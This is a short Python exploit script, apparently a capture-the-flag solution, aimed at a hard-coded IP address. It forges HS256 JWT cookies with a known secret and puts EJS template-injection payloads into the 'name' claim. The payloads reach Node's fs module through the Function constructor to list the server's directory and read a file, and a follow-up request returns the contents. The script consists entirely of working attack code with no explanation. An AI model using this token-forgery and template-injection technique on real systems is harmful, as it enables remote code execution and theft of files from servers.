import jwt
import time
import requests

url = 'http://103.152.242.37:20202/?yearOfBirth=1999'
secret = "3329425438746"
id = "2cf50e1b-7706-406c-b757-505a7b91015a"


class Exploit:
    def __init__(self, payload, secret=secret, id=id, url=url):
        self.id = id
        self.secret = secret
        self.url = url
        self.out = self.send_payload(payload)
        
    def __str__(self):
        return self.out
    
    def send_payload(self, payload):
        token = jwt.encode(
            {
                "name": payload,
                "id": id,
                "iat": int(time.time())
            },
            key=secret,
            algorithm="HS256"
        )
        return requests.get(self.url, cookies={'token': token}).text

# print(Exploit("<%= ([]).constructor.constructor(import('fs').then(d => a=d.readdirSync('./')))(); %>"))
# print(Exploit("<%= a; %>"))
print(Exploit("<%= ([]).constructor.constructor(import('fs').then(d => b=d.readFileSync(c[2])))(); %>"))
time.sleep(3)
print(Exploit("<%= b; %>"))